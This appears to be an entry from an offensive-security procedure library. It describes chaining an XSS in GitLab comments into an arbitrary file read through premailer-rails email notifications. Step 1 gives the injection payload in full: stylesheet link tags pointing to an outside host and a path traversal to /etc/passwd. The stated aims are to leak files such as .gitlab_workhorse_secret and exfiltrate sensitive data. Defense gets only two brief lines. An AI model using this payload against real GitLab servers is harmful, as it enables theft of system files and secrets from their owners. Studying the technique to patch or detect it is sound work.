---
tags:
  - file-read
  - gitlab
  - email-injection
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands: []
platforms:
  - Web
  - GitLab
techniques:
  - '[[File and Directory Discovery]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 1c9218a3-b650-4e42-bfd9-2ad04ad30c4d
created_at: '2025-12-14T00:11:16.693Z'
updated_at: '2025-12-14T00:11:16.693Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Chain XSS to Arbitrary File Read

## Summary

This procedure chains the XSS to inject stylesheet links in comments, leading to arbitrary file reads via premailer-rails in GitLab email notifications.

## Description

Injected link tags cause premailer-rails to load and inline CSS from local files using path traversal, leaking contents in emails. Targets files like /etc/passwd or .gitlab_workhorse_secret.

## Requirements

1. Active XSS in an issue
2. Ability to post comments triggering emails
3. Access to email notifications

## Defense

Defensive measures and detection strategies:

- Restrict FileSystemLoader to safe paths
- Sanitize injected HTML in emails

## Objectives

1. Inject stylesheet links for file loading
2. Leak file contents in email
3. Exfiltrate sensitive data

## Instructions

### Step 1: Inject Stylesheet Links

**Context**: Post comment with malicious links.

Inject: <link rel='stylesheet' href='http://aw.rs/css/a'> <link rel='stylesheet' href='../../../../../../../../../../../etc/passwd'> <link rel='stylesheet' href='http://aw.rs/css/c'>.

> This triggers loading of local files.

### Step 2: Trigger and Observe Email

**Context**: Generate notification and check email.

Perform action to send email notification and inspect the inlined CSS for leaked file contents.

> Expected: File contents appear in email.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[File and Directory Discovery]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- file-read
- gitlab
- email-injection
